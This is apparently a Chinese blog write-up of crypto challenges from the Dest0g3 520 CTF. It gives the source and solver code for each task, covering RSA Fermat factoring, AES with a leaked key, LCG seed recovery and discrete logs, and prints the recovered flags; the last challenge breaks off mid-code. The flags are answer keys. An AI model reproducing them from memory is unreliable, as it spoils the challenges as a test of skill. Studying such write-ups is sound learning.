        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Dest0g3-520迎新赛"><a href="#Dest0g3-520迎新赛" class="headerlink" title="Dest0g3 520迎新赛"></a>Dest0g3 520迎新赛</h1><blockquote><p>并不详细的wp，最近事情较多，假期了再来仔细分析🧐</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220601165806112.png" alt="solution"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220601165859967.png" alt="rank"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import bytes_to_long, getPrime</span><br><span class="line">from gmpy2 import next_prime</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">print(n)</span><br><span class="line">print(c)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"><span class="number">27272410937497</span><span class="number">61542918401733</span><span class="number">54373674662889</span><span class="number">81498585803398</span><span class="number">56145630001944</span><span class="number">77020014031658</span><span class="number">85200936510173</span><span class="number">98038048982882</span><span class="number">85239833887300</span><span class="number">26101865884520</span><span class="number">67987267156953</span><span class="number">21017084693445</span><span class="number">62155718974222</span><span class="number">19668454400307</span><span class="number">17656251344896</span><span class="number">32331414011555</span><span class="number">53613028910682</span><span class="number">27325449045024</span><span class="number">28727133498239</span><span class="number">16132462569827</span><span class="number">03817156403321</span><span class="number">11381465813621</span><span class="number">90846531107667</span><span class="number">83376958191241</span><span class="number">78638737015840</span><span class="number">94122334217656</span><span class="number">34581819188656</span><span class="number">41701282965455</span><span class="number">70579045665843</span><span class="number">16416324707876</span><span class="number">89389714643528</span><span class="number">96803751926514</span><span class="number">49194654025619</span><span class="number">59014798324908</span><span class="number">01094763283428</span><span class="number">16986388486836</span><span class="number">32113623788303</span><span class="number">92193990816845</span><span class="number">04921976717611</span><span class="number">67009855312820</span><span class="number">36442764829649</span><span class="number">45717942981055</span><span class="number">43758141065915</span><span class="number">25767430508126</span>7</span><br><span class="line"><span class="number">14181751948841</span><span class="number">20614899532073</span><span class="number">11381669248413</span><span class="number">07246014981115</span><span class="number">73674893445176</span><span class="number">36703043084962</span><span class="number">61846056687977</span><span class="number">91772867199104</span><span class="number">97121297459060</span><span class="number">89287169170294</span><span class="number">25985660130071</span><span class="number">73301539870802</span><span class="number">12591008738712</span><span class="number">34400444362351</span><span class="number">80407860097711</span><span class="number">08879196701679</span><span class="number">83378202287532</span><span class="number">44992014755222</span><span class="number">41396314392429</span><span class="number">41274739220380</span><span class="number">91252453934629</span><span class="number">52461525539673</span><span class="number">21872134185351</span><span class="number">50992016427695</span><span class="number">77031724762640</span><span class="number">31708125204660</span><span class="number">65641082116264</span><span class="number">46676911167979</span><span class="number">49232901238165</span><span class="number">40876189796319</span><span class="number">24439276786566</span><span class="number">07885638583578</span><span class="number">69950110677201</span><span class="number">24277812004808</span><span class="number">43134714859388</span><span class="number">27914763919444</span><span class="number">10064371926611</span><span class="number">18049684701010</span><span class="number">71674865219273</span><span class="number">40045188960373</span><span class="number">15589471749870</span><span class="number">04889829102178</span><span class="number">50877130989318</span><span class="number">70658015525185</span>4</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>费马分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isqrt</span>(<span class="params">n</span>):</span></span><br><span class="line">    x = n</span><br><span class="line">    y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermat</span>(<span class="params">n, verbose=<span class="literal">True</span></span>):</span></span><br><span class="line">    a = isqrt(n)  <span class="comment"># int(ceil(n**0.5))</span></span><br><span class="line">    b2 = a * a - n</span><br><span class="line">    b = isqrt(n)  <span class="comment"># int(b2**0.5)</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b * b != b2:</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        b2 = a * a - n</span><br><span class="line">        b = isqrt(b2)  <span class="comment"># int(b2**0.5)</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    p = a + b</span><br><span class="line">    q = a - b</span><br><span class="line">    <span class="keyword">assert</span> n == p * q</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line">p, q = fermat(n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">os</span></span><br><span class="line">iv = <span class="built_in">os</span>.urandom(<span class="number">16</span>)</span><br><span class="line">key = <span class="built_in">os</span>.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = open(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - len(flag) % <span class="number">16</span>) * b<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">b&#x27;</span><span class="name">C4</span>:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07<span class="string">&#x27;</span></span><br><span class="line"><span class="string">b&#x27;</span>\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80<span class="string">&#x27;</span></span><br><span class="line"><span class="string">b&#x27;</span>\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"><span class="attribute">iv</span> = b&#x27;\xd<span class="number">1</span>\xdf\x<span class="number">8</span>f)\x<span class="number">08</span>w\xde\xf<span class="number">9</span>yX%\xca[\xcb\x<span class="number">18</span>\x<span class="number">80</span>&#x27;</span><br><span class="line"><span class="attribute">key</span> = b&#x27;\xa<span class="number">4</span>\xa<span class="number">6</span>M\xab&#123;\xf<span class="number">6</span>\x<span class="number">97</span>\x<span class="number">94</span>&gt;hK\x<span class="number">9</span>bBe]F&#x27;</span><br><span class="line"><span class="attribute">c</span> = b&#x27;C<span class="number">4</span>:\x<span class="number">86</span>Q$\xb<span class="number">0</span>\xd<span class="number">1</span>\x<span class="number">1</span>b\xa<span class="number">9</span>L\x<span class="number">00</span>\xad\xa<span class="number">3</span>\xff\x<span class="number">96</span> hJ\x<span class="number">1</span>b~\x<span class="number">1</span>c\xd<span class="number">1</span>y\x<span class="number">87</span>A\xfe<span class="number">0</span>\xe<span class="number">2</span>\xfb\xc<span class="number">7</span>\xb<span class="number">7</span>\x<span class="number">7</span>f^\xc<span class="number">8</span>\x<span class="number">9</span>aP\xdaX\xc<span class="number">6</span>\xdf\x<span class="number">17</span>l=K\x<span class="number">95</span>\xd<span class="number">07</span>&#x27;</span><br><span class="line"><span class="attribute">flag</span>  = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="attribute">flag</span> = flag.decrypt(c)</span><br><span class="line"><span class="attribute">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ezStream"><a href="#ezStream" class="headerlink" title="ezStream"></a>ezStream</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">8</span>] == <span class="string">&quot;Dest0g3&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.a = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.b = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.a, self.b, self.m))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line">lcg.output()</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="built_in">ord</span>(flag[i]) ^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 3939333498</span></span><br><span class="line"><span class="string">b = 3662432446</span></span><br><span class="line"><span class="string">m = 2271373817</span></span><br><span class="line"><span class="string">state1 = 17362</span></span><br><span class="line"><span class="string">state2 = 20624</span></span><br><span class="line"><span class="string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><h4 id="爆破求seed2"><a href="#爆破求seed2" class="headerlink" title="爆破求seed2"></a>爆破求seed2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆破出seed2</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">3939333498</span></span><br><span class="line">b = <span class="number">3662432446</span></span><br><span class="line">m = <span class="number">2271373817</span></span><br><span class="line">state1 = <span class="number">17362</span></span><br><span class="line">state2 = <span class="number">20624</span></span><br><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    s = state1&lt;&lt;<span class="number">16</span></span><br><span class="line">    s+=i</span><br><span class="line">    <span class="keyword">if</span> ((a*s+b)%m)&gt;&gt;<span class="number">16</span> == state2:</span><br><span class="line">        s2 = (a*s+b)%m</span><br><span class="line">        <span class="built_in">print</span> s2</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1351665013</span></span><br><span class="line"><span class="string">1351671098</span></span><br><span class="line"><span class="string">1351677183</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h4 id="求flag"><a href="#求flag" class="headerlink" title="求flag"></a>求flag</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.a = <span class="number">3939333498</span></span><br><span class="line">        self.b = <span class="number">3662432446</span></span><br><span class="line">        self.m = <span class="number">2271373817</span></span><br><span class="line">        self.seed = <span class="number">1351677183</span>  <span class="comment"># 一个一个试</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        1351665013</span></span><br><span class="line"><span class="string">        1351671098</span></span><br><span class="line"><span class="string">        1351677183</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line">c = long_to_bytes(c)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i ^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> c])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h2><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>sage离散对数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line"># h = g^x <span class="keyword">mod</span> p</span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">h = <span class="number">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line">x = discrete<span class="constructor">_log(Mod(<span class="params">h</span>,<span class="params">p</span>)</span>,<span class="constructor">Mod(<span class="params">g</span>,<span class="params">p</span>)</span>)</span><br><span class="line">print(libnum.n2s(<span class="built_in">int</span>(x)))</span><br><span class="line"># b&#x27;Dest0g3&#123;<span class="number">07</span>ed2a6f-<span class="number">182</span>f-a05d-c81e-<span class="number">1318</span>af820a78&#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="Mr-Doctor"><a href="#Mr-Doctor" class="headerlink" title="Mr.Doctor"></a>Mr.Doctor</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()[<span class="number">8</span>:-<span class="number">1</span>]</span><br><span class="line">seed = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHA256</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof = []</span><br><span class="line">        self.sha = <span class="number">0</span></span><br><span class="line">        self.sha_flag = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // <span class="number">4</span>):</span><br><span class="line">            self.proof.append(flag[<span class="number">4</span> * i:<span class="number">4</span> + <span class="number">4</span> * i])</span><br><span class="line">            self.sha = sha256(self.proof[i]).hexdigest().encode()</span><br><span class="line">            self.sha_flag.append(bytes_to_long(self.sha))</span><br><span class="line">        <span class="keyword">return</span> self.sha_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RHODES_ELITE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Doctor = getPrime(<span class="number">64</span>)</span><br><span class="line">        self.Amiya = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Rosmontis = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Blaze = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.seed = seed</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Amiya = &quot;</span>, self.Amiya)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blaze = &quot;</span>, self.Blaze)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Doctor = &quot;</span>, self.Doctor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sha = SHA256()</span><br><span class="line">sha_flag = sha.encryption()</span><br><span class="line">elite = RHODES_ELITE()</span><br><span class="line">elite.output()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ash = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SliverAsh = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line">W = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="number">3</span>) ^ (elite.<span class="built_in">next</span>() % <span class="number">100</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sha_flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(W))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Amiya =  956366446278</span></span><br><span class="line"><span class="string">Rosmontis =  1061992537343</span></span><br><span class="line"><span class="string">Blaze =  636205571590</span></span><br><span class="line"><span class="string">Doctor =  18068433704538283397</span></span><br><span class="line"><span class="string">Ash =  1097363493609113</span></span><br><span class="line"><span class="string">SliverAsh =  2051431344160327</span></span><br><span class="line"><span class="string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>seed1、seed2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 